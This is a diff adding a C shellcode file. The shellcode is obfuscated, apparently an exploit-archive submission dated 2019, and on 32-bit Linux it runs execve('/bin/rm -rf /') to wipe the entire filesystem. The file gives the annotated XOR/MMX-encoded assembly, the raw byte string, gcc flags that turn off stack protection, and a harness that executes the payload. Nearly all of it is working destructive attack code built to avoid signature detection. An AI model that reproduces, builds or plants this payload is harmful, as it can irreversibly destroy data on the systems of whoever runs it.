@@ -1,0 +1,55 @@
+/*
+ Title   : Polymorphic/obfuscated execve '/bin/rm -rf /' (64 bytes - 142% of the original code)
+ Date    : 10th Sep 2019
+ Author  : Vikrant Navalgund
+ System  : Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:06:14 UTC 2016 i686 i686 i686 GNU/Linux
+
+ To build:
+      gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+
+BITS 32
+
+section .text
+global _start
+
+; execve("/bin/rm", {"/bin/rm", "-rf", "/", 0}, 0) - 64 bytes
+_start:
+	push 0xabd9c5c9
+	push 0xc684c284
+	movd mm0, [esp]
+	movd mm1, [esp+4h]
+	punpcklbw mm0, mm1
+	mov ebx, esp
+	movq [ebx], mm0
+	xor ecx,ecx
+	imul ecx
+	push 0x2f
+	mov ecx, esp
+	push 0xabcdd986
+	mov edx, esp
+	mov esi, 0xabababab
+	xor dword [edx], esi
+	pushad
+	lea ecx, [esp+10h]
+	cdq
+	add al, 0xb
+	xor dword [ebx], esi
+	xor dword [ebx+4h], esi
+	int 0x80
+ */
+
+#include<stdio.h>
+
+unsigned char code[] = \
+"\x68\xc9\xc5\xd9\xab\x68\x84\xc2\x84\xc6\x0f\x6e\x04\x24\x0f\x6e"
+"\x4c\x24\x04\x0f\x60\xc1\x89\xe3\x0f\x7f\x03\x31\xc9\xf7\xe9\x6a"
+"\x2f\x89\xe1\x68\x86\xd9\xcd\xab\x89\xe2\xbe\xab\xab\xab\xab\x31"
+"\x32\x60\x8d\x4c\x24\x10\x99\x04\x0b\x31\x33\x31\x73\x04\xcd\x80";
+
+main()
+{
+    printf("Shellcode Length: %d\n", sizeof(code)-1);
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+
